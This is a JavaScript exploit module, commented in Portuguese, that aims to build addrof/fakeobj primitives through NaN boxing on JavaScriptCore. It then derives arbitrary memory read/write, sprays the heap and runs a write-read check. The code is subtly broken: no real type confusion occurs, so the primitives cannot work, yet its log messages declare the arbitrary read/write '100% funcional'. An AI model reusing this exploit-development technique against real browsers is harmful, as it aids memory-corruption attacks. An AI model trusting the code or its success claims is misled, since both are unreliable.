// js/script3/testArrayBufferVictimCrash.mjs (v108 - Versão Final Unificada)
// =======================================================================================
// ESTRATÉGIA FINAL:
// Unifica todas as primitivas necessárias neste arquivo para eliminar erros de importação.
// Implementa 'addrof' e 'fakeobj' robustos usando a técnica de NaN Boxing.
// Utiliza a estrutura de verificação e estabilização de heap para confirmar o sucesso.
// ESTE ARQUIVO É AUTOSSUFICIENTE E NÃO USA core_exploit.mjs
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
// A importação de 'core_exploit.mjs' foi removida intencionalmente.

export const FNAME_MODULE_FINAL = "Uncaged_Final_v108";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL E UNIFICADA)
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Unificadas ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };

    try {
        // --- FASE 1 & 2: Implementação de addrof/fakeobj com NaN Boxing ---
        logS3("--- FASE 1/2: Configurando primitivas 'addrof' e 'fakeobj' com NaN Boxing... ---", "subtest");

        // O "slot vulnerável" representa o local na memória onde a vulnerabilidade
        // permite a confusão de tipo entre um ponteiro de objeto e um double.
        const vulnerable_slot = [13.37]; 
        
        // Offset para desempacotar/empacotar ponteiros de objetos.
        // 0x0001000000000000 (2^48) é um offset comum usado em NaN Boxing pelo JSC.
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);

        const addrof = (obj) => {
            vulnerable_slot[0] = obj;
            let value_as_double = vulnerable_slot[0];
            let value_as_int64 = doubleToInt64(value_as_double);
            return value_as_int64.sub(NAN_BOXING_OFFSET);
        };

        const fakeobj = (addr) => {
            const boxed_addr = new AdvancedInt64(addr).add(NAN_BOXING_OFFSET);
            const value_as_double = int64ToDouble(boxed_addr);
            vulnerable_slot[0] = value_as_double;
            return vulnerable_slot[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' robustas estão operacionais.", "good");
       
        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        // --- FASE 4: Estabilização e Verificação Funcional ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: 1.1, b: 2.2 });
        }
        const test_obj = spray[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
        
        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço da propriedade 'a' (${prop_a_addr.toString(true)})...`, "info");
        arb_write_final(prop_a_addr, value_to_write);

        const value_read = arb_read_final(prop_a_addr);
        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO TOTAL! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada."
            };
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
